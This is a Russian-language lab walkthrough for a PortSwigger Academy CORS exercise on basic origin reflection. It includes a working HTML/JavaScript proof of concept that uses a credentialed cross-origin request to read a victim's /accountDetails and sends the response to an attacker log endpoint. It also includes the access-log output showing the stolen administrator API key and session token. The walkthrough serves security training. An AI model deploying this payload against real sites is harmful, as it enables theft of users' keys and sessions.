Залогинимся под `wiener:peter`

Перейдем в `Proxy` -> `HTTP history` и посмотрим последовательность запросов 

И найдем следующий запрос, который возвращает нам наш api ключ, сессию и имя пользователя 
```
GET /accountDetails
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/1.%20CORS%20vulnerability%20with%20basic%20origin%20reflection/pics%20for%20walkthrough/1.png)

Отправим данный запрос в `Repeater`

и добавим к данному запросу следующий параметр
```
Origin: https://test.com
```
и видим добавление дополнительных header'ов в ответах
```
Access-Control-Allow-Origin: https://test.com

Access-Control-Allow-Credentials: true
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/1.%20CORS%20vulnerability%20with%20basic%20origin%20reflection/pics%20for%20walkthrough/2.png)

Далее перейдем в `Exploit server` и сконфигурируем следующий PoC

```
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://0af400ab036e9e4080864edf002000ff.web-security-academy.net"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```
Нажмем `Store` и `Deliver exploit to victim`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/1.%20CORS%20vulnerability%20with%20basic%20origin%20reflection/pics%20for%20walkthrough/3.png)

После отправки зайдем в `access log`
```
10.0.3.158      2024-03-24 11:14:13 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22qgio0DfCfBmaGTUK9PMjWcP2zNmk1zyE%22,%20%20%22sessions%22:%20[%20%20%20%20%22gk7LDNUGhewt4GLelAhKce6Cx3FDDJRl%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
```
и увидим api ключ `qgio0DfCfBmaGTUK9PMjWcP2zNmk1zyE`

сдадим его в качестве ответа и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/1.%20CORS%20vulnerability%20with%20basic%20origin%20reflection/pics%20for%20walkthrough/4.png)

